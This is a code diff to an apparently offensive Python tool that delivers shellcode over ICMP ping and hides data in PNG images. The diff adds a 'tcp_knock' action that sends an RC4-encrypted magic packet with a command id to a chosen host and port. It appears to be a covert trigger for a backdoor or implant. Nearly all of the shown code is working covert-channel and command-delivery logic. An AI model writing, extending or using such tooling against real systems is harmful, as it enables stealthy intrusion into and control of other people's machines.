@@ -27,6 +27,7 @@ import argparse
 import base64
 import os
 import re
+import socket
 import struct
 import sys
 import time
@@ -122,12 +123,16 @@ def main(argv):
     shellcode.add_argument('src', help='Specify src as file path, hex string, base64 string or - to read from stdin')
 
     # Transports
-    ping = action.add_parser('ping', help='Send src using icmp ping')
-    ping.add_argument('target', help='Ping target')
+    arg = action.add_parser('ping', help='Send src using icmp ping')
+    arg.add_argument('target', help='Ping target')
 
-    ping = action.add_parser('png', help='Encode src into PNG image')
-    ping.add_argument('inout', help='PNG image in RGB format that will be used to encode data into')
+    arg = action.add_parser('png', help='Encode src into PNG image')
+    arg.add_argument('inout', help='PNG image in RGB format that will be used to encode data into')
 
+    arg = action.add_parser('tcp_knock', help='Send a knock to a tcp port (grand theft socket)')
+    arg.add_argument('target', help='IP address or a hostname of target server')
+    arg.add_argument('port', help='Port on target server')
+ 
     arg_list = []
     key = None
     while argv:
@@ -186,6 +191,15 @@ def main(argv):
 
             from_array(pixels, 'RGB').save(args.inout)
             print(args.inout, 'saved')
+
+        elif args.action == 'tcp_knock':
+            command_id = 1
+            payload = struct.pack('!IIB', magic_v1, int(time.time()), command_id)
+            payload = rc4(payload, read_key(key))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((args.target, int(args.port)))
+            s.send(payload)
+            s.close()
 
     return 0
 
